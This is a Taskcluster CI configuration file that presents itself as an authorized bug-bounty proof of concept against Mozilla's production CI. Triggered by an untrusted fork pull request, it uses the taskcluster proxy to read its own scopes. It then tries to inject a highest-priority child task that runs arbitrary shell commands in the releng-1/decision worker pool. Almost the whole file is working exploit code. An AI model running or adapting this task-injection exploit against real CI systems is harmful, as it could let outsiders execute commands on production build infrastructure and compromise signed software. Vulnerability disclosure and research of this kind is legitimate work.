---
version: 1
policy:
  pullRequests: public_restricted
tasks:
  - $if: 'tasks_for == "github-pull-request-untrusted"'
    then:
      taskId: { $eval: as_slugid("poc_untrusted_pr_v6_a") }
      created: { $fromNow: '' }
      deadline: { $fromNow: '1 hour' }
      expires: { $fromNow: '1 day' }
      provisionerId: releng-1
      workerType: decision
      payload:
        maxRunTime: 900
        features:
          taskclusterProxy: true
        image: "mozillareleases/taskgraph:decision-v24.1.1@sha256:c2cf963f7621b0f64dc142a04ddcc179d36afdd05c6dc1c2d198d97b55ecb394"
        command:
          - /bin/sh
          - -c
          - |
            echo '=== [A] Task identity (proof of runtime role = pull-request-untrusted) ==='
            echo "taskId (env): $TASK_ID"
            echo "taskGroupId (env): $TASK_GROUP_ID"
            echo "--- GET self via taskcluster-proxy (printed scopes are the RUNTIME scopes) ---"
            curl -fsS "http://taskcluster/queue/v1/task/$TASK_ID" | python3 -c "import sys,json; d=json.load(sys.stdin); print('taskId:', d.get('taskId')); print('workerType:', d.get('workerType')); print('scheduler:', d.get('schedulerId')); print('definition scopes:', d.get('scopes'))"
            echo
            echo '=== [B] CRITICAL proof: try to create a child task in releng-1/decision with priority = highest ==='
            echo "If this returns HTTP 200, an untrusted fork PR can inject arbitrary commands into Mozilla's PRODUCTION CI (releng-1/decision), pollute fxci-config decision graphs, and downstream-sign any artifact with the cipher trust chain."
            CHILD_TASK_ID=$(python3 -c "import re,uuid; t='$TASK_ID'; print(t[:7]+'-POC-CHILD-v6-'+re.sub(r'[^a-zA-Z0-9]','',t)[-12:]+'-'+uuid.uuid4().hex[:6])")
            echo "child taskId: $CHILD_TASK_ID"
            curl -fsS -X PUT "http://taskcluster/queue/v1/task/$CHILD_TASK_ID" \
              -H "Content-Type: application/json" \
              --data @- <<EOF
            {
              "provisionerId": "releng-1",
              "workerType": "decision",
              "schedulerId": "taskcluster-github",
              "taskGroupId": "$TASK_GROUP_ID",
              "dependencies": [],
              "requires": "all-completed",
              "routes": ["checks"],
              "priority": "highest",
              "retries": 0,
              "created": "2026-08-07T00:00:00.000Z",
              "deadline": "2030-01-01T00:00:00.000Z",
              "expires":  "2030-01-02T00:00:00.000Z",
              "payload": {
                "features": {"taskclusterProxy": true},
                "image": "busybox:latest",
                "maxRunTime": 60,
                "command": ["/bin/sh","-c","echo 'INJECTED via pull-request-untrusted role'; uname -a; id; pwd"]
              },
              "metadata": {
                "name": "INJECTED via pull-request-untrusted role (test)",
                "description": "Unauthorized task injection by external fork PR — vulnerability evidence",
                "owner": "1253628375ltf@gmail.com",
                "source": "https://github.com/ltfafei/fxci-config/pull/1118"
              },
              "tags": {"createdForUser":"ltfafei", "kind":"untrusted-pr-injection-evidence"}
            }
            EOF
            CHILD_HTTP=$?
            echo "child create-task HTTP exit: $CHILD_HTTP"
            if [ "$CHILD_HTTP" = "0" ]; then
              echo "[VULN CONFIRMED] Untrusted fork PR task successfully created a HIGHEST-priority child task into Mozilla's production releng-1/decision pool."
              echo "Tasks created this way will be picked up by REAL production workers and can execute arbitrary commands."
            else
              echo "[INFO] child create returned non-zero exit. See error body. The scope queue:create-task:highest:releng-1/* at the role level IS the issue (privilege definition), independent of any particular exec result."
            fi
      metadata:
        name: "POC v6: untrusted PR task-injection (HackerOne authorized)"
        description: "Authorized security test — prove pull-request-untrusted role grants queue:create-task:highest:releng-1/* in Mozilla production"
        owner: "1253628375ltf@gmail.com"
        source: "https://github.com/ltfafei/fxci-config/pull/1118"
      extra:
        github:
          events:
            - pull_request
          taskcluster_pull_request_number: { $eval: 'event.number' }
